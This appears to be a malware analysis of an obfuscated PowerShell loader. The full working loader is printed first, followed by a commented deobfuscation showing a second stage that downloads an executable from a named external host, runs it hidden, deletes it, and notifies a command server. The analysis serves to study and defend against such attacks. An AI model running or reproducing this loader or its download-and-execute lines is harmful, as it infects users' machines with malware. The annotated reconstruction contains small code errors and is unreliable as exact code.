<#Verification ID: 87b562d0851194ca#> 
$cbaw2='eCsrOjYwYXE2MzUydBx0bmRwbHBscGhwa3BrZHBlbXBlbXBuaXBubXBuaXBocG5rcG1qcG5lcG9tcGVscG5tcGtwbmVwbm1wZW1wbm1waHBuZXBlbXBuZXBuanBtanBta3BtbnBlbHBocG5kcGhwa2lwbm1wa29wbWpwbmhwZG5wbHBua3BvbXBta3BuanBrb3BranBub3BubXBubXBtZHBra3BqaXBrbXBtanBranBra3BqaHBqa3BranBubnBranBubXBqa3BqZXBra3BqZXBta3BubnBrbXBrbHBrbHBra3BqaXBub3BqZXBqZXBqa3BubXBrbXBqZXBqZHBubnBqaXBrbXBubXBub3Bra3BqZHBqaXBra3BtanBqaHBubXBtanBqanBra3BubXBqZXBta3BrbXBra3Bqa3Bta3Bub3BrbXBubnBrbHBtanBqaHBkbnBqcG5wa29wbm9wbWpwbm9wa2twa2xwamtwamlwa2twamlwbm1wa2twamRwbm5wamVwa2twbm1wa2pwbm9wamVwbWRwbWpwamhwa2pwamRwbWpwa21wamtwbWRwa21wamtwbWRwa2twZG5wa3BqcG5vcGtvcG5tcGpwbm9wbmtwZWxwbmtwanBtZXBlbHBuZXBuaHBkbnBuaXBua3BtanBta3Brb3Bub3BuaHBua3BtcG1qcG1kcG5ocG5tcGpwbWt1IHknBz80PS4BdHgDfHE+JDMubW1qdSF1Z3gwNWxsNmF7GDMrMnt3ezAzPTgYPSg9e2d4KypsPWlhewsuNSg5e3d7HTAwHiUoOS97Z3g0JiY/KmEHFRNyDD0oNAFmZh8zMT41Mjl0BxUTcgw9KDQBZmYbOSgIOTEsDD0oNHR1cAcVE3IMPSg0AWZmGzkoDj0yODMxGjUwORI9MTl0dXVnBxUTchg1Ljk/KDMuJQFmZh8uOT0oORg1Ljk/KDMuJXR4NCYmPyp1IBMpKHESKTAwZ3gsLzM5KGEHFRNyDD0oNAFmZh8zMT41Mjl0eDQmJj8qcAcVE3IMPSg0AWZmGzkoDj0yODMxGjUwORI9MTl0dXd7cjkkOXt1Z3gqbys5JGESOStxEz42OT8ofHR7Ejl7d3socgs5Ph8wNTkyKHt1Z3gyNy4+LGFsZzozLnR4NWFsZ3g1fHEwKHxvfHE9Mjh8fXgyNy4+LGd4NXd3dScoLiUnBxUTcho1MDkBZmZ4KypsPWl0eCwvMzkocHgqbys5JHJ4MDVsbDZ0eCsrOjYwdXVnNTp0BxUTcho1MDkBZmYZJDUvKC90eCwvMzkodXUneDI3Lj4sYW0hOTAvOScPKD0uKHEPMDk5LHxuISE/PSg/NCcPKD0uKHEPMDk5LHxuISFnNTp0fXgyNy4+LHUnOSQ1KCFnDyg9LihxDC4zPzkvL3xxGjUwOQw9KDR8eCwvMzkofHELNTI4MysPKCUwOXwUNTg4OTJnDyg9LihxDzA5OSx8b2coLiUnDjkxMyo5cRUoOTF8eCwvMzkofHEaMy4/OSE/PSg/NCchZ3gkMSptZGFxNjM1MnQcdG5kcGxwbHBocGtwa2RwZW1wZW1wbmlwbm1wbmlwaHBua3BtanBuZXBvbXBlbHBubXBrcG5lcG5tcGVtcG5tcGhwbmVwZW1wbmVwbmpwbWpwbWtwbW5wZWxwaHBuZHBocGtpcG5tcGtvcG1rcG5wbHBkbnBrcGpwbm9wa29wbm1wanBub3Bua3BlbHBua3BqcG1lcGVscG5lcG5ocGRucGxwa29wbm1wbm9wb211IHknBz80PS4BdHgDfHE+JDMubW1qdSF1ZyguJScHKjM1OAF4Km8rOSRyGDMrMjAzPTgPKC41Mjt0eCQxKm1kdSE/PSg/NCch';
$f5jbu=[Object].Assembly.GetType(-join(@(16,58,48,55,38,46,109,0,44,45,53,38,49,55)|%{[char]($_ -bxor67)}));
$ioxp3=$f5jbu.GetMethod(-join(@(5,49,44,46,1,34,48,38,117,119,16,55,49,42,45,36)|%{[char]($_ -bxor67)}),[type[]]@([string]));
$x7njx=-join($ioxp3.Invoke($null,[array]$cbaw2)|%{[char]($_ -bxor 92)});
$ykwlg=[Object].Assembly.GetType(-join(@(16,58,48,55,38,46,109,23,38,59,55,109,6,45,32,44,39,42,45,36)|%{[char]($_ -bxor67)}));
$zp15h=$ykwlg.GetProperty(-join(@(22,45,42,32,44,39,38)|%{[char]($_ -bxor67)})).GetValue($null);
$bcv6w=$ykwlg.GetMethod(-join(@(4,38,55,1,58,55,38,48)|%{[char]($_ -bxor67)}),[type[]]@([string]));
$mfz8n=$bcv6w.Invoke($zp15h,(,$x7njx));
$a6dwz=$f5jbu.GetMethod(-join(@(23,44,1,34,48,38,117,119,16,55,49,42,45,36)|%{[char]($_ -bxor67)}),[type[]]@([byte[]]));
$bumgs=$a6dwz.Invoke($null,(,$mfz8n));
$idhmx=-join(@(51,44,52,38,49,48,43,38,47,47)|%{[char]($_ -bxor67)});
$vgcrm=-join(@(110,13,44,19,99,110,13,44,45,10,99,110,20,99,11,99,110,6,45,32,44,39,38,39,0,44,46,46,34,45,39,99)|%{[char]($_ -bxor67)})+$bumgs;
$hh4ms=-join(@(20,16,32,49,42,51,55,109,16,43,38,47,47)|%{[char]($_ -bxor67)});
$oe2hj=New-Object -ComObject $hh4ms;
$null=$oe2hj.Run($idhmx+[char]32+$vgcrm,0,$false);
exit;


# deobcfuscation:
$Base64String='eCsrOjYwYXE2MzUydBx0bmRwbHBscGhwa3BrZHBlbXBlbXBuaXBubXBuaXBocG5rcG1qcG5lcG9tcGVscG5tcGtwbmVwbm1wZW1wbm1waHBuZXBlbXBuZXBuanBtanBta3BtbnBlbHBocG5kcGhwa2lwbm1wa29wbWpwbmhwZG5wbHBua3BvbXBta3BuanBrb3BranBub3BubXBubXBtZHBra3BqaXBrbXBtanBranBra3BqaHBqa3BranBubnBranBubXBqa3BqZXBra3BqZXBta3BubnBrbXBrbHBrbHBra3BqaXBub3BqZXBqZXBqa3BubXBrbXBqZXBqZHBubnBqaXBrbXBubXBub3Bra3BqZHBqaXBra3BtanBqaHBubXBtanBqanBra3BubXBqZXBta3BrbXBra3Bqa3Bta3Bub3BrbXBubnBrbHBtanBqaHBkbnBqcG5wa29wbm9wbWpwbm9wa2twa2xwamtwamlwa2twamlwbm1wa2twamRwbm5wamVwa2twbm1wa2pwbm9wamVwbWRwbWpwamhwa2pwamRwbWpwa21wamtwbWRwa21wamtwbWRwa2twZG5wa3BqcG5vcGtvcG5tcGpwbm9wbmtwZWxwbmtwanBtZXBlbHBuZXBuaHBkbnBuaXBua3BtanBta3Brb3Bub3BuaHBua3BtcG1qcG1kcG5ocG5tcGpwbWt1IHknBz80PS4BdHgDfHE+JDMubW1qdSF1Z3gwNWxsNmF7GDMrMnt3ezAzPTgYPSg9e2d4KypsPWlhewsuNSg5e3d7HTAwHiUoOS97Z3g0JiY/KmEHFRNyDD0oNAFmZh8zMT41Mjl0BxUTcgw9KDQBZmYbOSgIOTEsDD0oNHR1cAcVE3IMPSg0AWZmGzkoDj0yODMxGjUwORI9MTl0dXVnBxUTchg1Ljk/KDMuJQFmZh8uOT0oORg1Ljk/KDMuJXR4NCYmPyp1IBMpKHESKTAwZ3gsLzM5KGEHFRNyDD0oNAFmZh8zMT41Mjl0eDQmJj8qcAcVE3IMPSg0AWZmGzkoDj0yODMxGjUwORI9MTl0dXd7cjkkOXt1Z3gqbys5JGESOStxEz42OT8ofHR7Ejl7d3socgs5Ph8wNTkyKHt1Z3gyNy4+LGFsZzozLnR4NWFsZ3g1fHEwKHxvfHE9Mjh8fXgyNy4+LGd4NXd3dScoLiUnBxUTcho1MDkBZmZ4KypsPWl0eCwvMzkocHgqbys5JHJ4MDVsbDZ0eCsrOjYwdXVnNTp0BxUTcho1MDkBZmYZJDUvKC90eCwvMzkodXUneDI3Lj4sYW0hOTAvOScPKD0uKHEPMDk5LHxuISE/PSg/NCcPKD0uKHEPMDk5LHxuISFnNTp0fXgyNy4+LHUnOSQ1KCFnDyg9LihxDC4zPzkvL3xxGjUwOQw9KDR8eCwvMzkofHELNTI4MysPKCUwOXwUNTg4OTJnDyg9LihxDzA5OSx8b2coLiUnDjkxMyo5cRUoOTF8eCwvMzkofHEaMy4/OSE/PSg/NCchZ3gkMSptZGFxNjM1MnQcdG5kcGxwbHBocGtwa2RwZW1wZW1wbmlwbm1wbmlwaHBua3BtanBuZXBvbXBlbHBubXBrcG5lcG5tcGVtcG5tcGhwbmVwZW1wbmVwbmpwbWpwbWtwbW5wZWxwaHBuZHBocGtpcG5tcGtvcG1rcG5wbHBkbnBrcGpwbm9wa29wbm1wanBub3Bua3BlbHBua3BqcG1lcGVscG5lcG5ocGRucGxwa29wbm1wbm9wb211IHknBz80PS4BdHgDfHE+JDMubW1qdSF1ZyguJScHKjM1OAF4Km8rOSRyGDMrMjAzPTgPKC41Mjt0eCQxKm1kdSE/PSg/NCch';
$ConvertClass = [Object].Assembly.GetType("System.Convert")  # object that represents System.Convert class's in .NET
$Base64Method = $ConvertClass.GetMethod("FromBase64String") # Gets the FromBase64String method
$NewScript = -join($Base64Method.Invoke($Base64String)|%{[char]($_ -bxor 92)}) # Decode the base64 string and then xor it with 92
# After decode and xor we get:
$NewScript = "$wwfjl=-join(@(28,0,0,4,7,78,91,91,25,21,25,4,27,16,29,31,90,21,7,29,21,91,21,4,29,91,29,26,16,17,12,90,4,28,4,75,21,73,16,24,82,0,27,31,17,26,73,76,23,21,21,18,77,65,71,16,76,77,64,67,76,22,76,21,67,69,77,69,17,22,71,70,70,77,65,23,69,69,67,21,71,69,68,22,65,71,21,23,77,68,65,77,16,64,21,16,66,77,21,69,17,71,77,67,17,23,71,22,70,16,64,82,6,2,73,23,16,23,77,70,67,65,77,65,21,77,68,22,69,77,21,76,23,69,18,16,64,76,68,16,71,67,18,71,67,18,77,82,7,6,23,73,21,6,23,27,90,27,6,19,90,29,24,82,25,27,16,17,73,23,24,27,1,16,18,24,21,6,17)|%{[char]($_ -bxor116)});
    $li00j='Down'+'loadData';
    $wv0a5='Write'+'AllBytes';
    $hzzcv=[IO.Path]::Combine([IO.Path]::GetTempPath(),[IO.Path]::GetRandomFileName());
    [IO.Directory]::CreateDirectory($hzzcv)|Out-Null;
    $psoet=[IO.Path]::Combine($hzzcv,[IO.Path]::GetRandomFileName()+'.exe');
    $v3wex=New-Object ('Ne'+'t.WebClient');
    $nkrbp=0;for($i=0;$i -lt 3 -and !$nkrbp;$i++){try{[IO.File]::$wv0a5($psoet,$v3wex.$li00j($wwfjl));
    if([IO.File]::Exists($psoet)){$nkrbp=1}else{Start-Sleep 2}}catch{Start-Sleep 2}};
    if(!$nkrbp){exit};
    Start-Process -FilePath $psoet -WindowStyle Hidden;
    Start-Sleep 3;try{Remove-Item $psoet -Force}catch{};
    $xmv18=-join(@(28,0,0,4,7,78,91,91,25,21,25,4,27,16,29,31,90,21,7,29,21,91,21,4,29,91,29,26,16,17,12,90,4,28,4,75,21,73,17,2,0,82,7,6,23,73,21,6,23,27,90,27,6,19,90,29,24,82,0,73,21,23,31)|%{[char]($_ -bxor116)});
    try{[void]$v3wex.DownloadString($xmv18)}catch{}"

# After deobfuscation we get:
$NewScript = "$NewURL=https://mampodik.asia/api/index.php?a=dl&token=8caaf953d89478b8a7191eb32295c117a310b53ac9059d4ad69a1e397ec3b2d4&rv=cdc927595a90b19a8c1fd480d37f37f9&src=arco.org.il&mode=cloudflare
    $action1 = 'DownloadData';
    $action2 = 'WriteAllBytes';
    $tmpPath = '<Random file in the user's temp folder>'
    [IO.Directory]::CreateDirectory($tmpPath)|Out-Null; # creates the folder
    $exePath = '<Random file in the user's temp folder>.exe' # adds .exe to the file
    $WebCilent = New-Object('Net.WebClient');
    # This tries up to 3 times to download a file from the URL, and then write it into the random file generated
    $flag=0; for($i=0;$i -lt 3 -and !$flag;$i++) {try{[IO.File]::WriteAllBytes($exePath,$WebCilent.DownloadData($NewURL));
    if([IO.File]::Exists($exePath)){$flag=1}else{Start-Sleep 2}}catch{Start-Sleep 2}};
    if(!$flag){exit};
    Start-Process -FilePath $exePath -WindowStyle Hidden; # Running the file
    Start-Sleep 3;try{Remove-Item $exePath -Force}catch{}; # Deletes the file (anti-forensics)
    $anotherURL = https://mampodik.asia/api/index.php?a=evt&src=arco.org.il&t=ack
    try{[void]$WebCilent.DownloadString($anotherURL)}catch{} # It tries to send a request to the URL, probably to notify the C2 that the file was executed successfully.
    "


# Back to the main script:
$encoding = [Object].Assembly.GetType("System.Text.Encoding");
$unicode_encoding=$encoding.GetProperty("Unicode").GetValue($null); # Gets the Unicode encoding
$getBytes = $encoding.GetMethod("GetBytes");
$PayloadBytes = $getBytes.Invoke($unicode_encoding,(,$NewScript)); # Gets the bytes of the script
$ToBase64Method=$encoding.GetMethod("ToBase64Stringe");
$encodedPayloadBytes=$ToBase64Method.Invoke($null,(,$PayloadBytes)); # Encodes the bytes to base64
$command = "powershell"
$arguments=" -NoP -NonI -W H -EncodedCommand" + $encodedPayloadBytes; # The final command that will be executed in cmd
$shell = "WScript.Shell";
$shellObj=New-Object -ComObject WScript.Shell;
$null=$shellObj.Run($command + [char]32 + $arguments,0,$false); # Runs the command in cmd, with hidden window and doesn't wait for it to finish
exit;








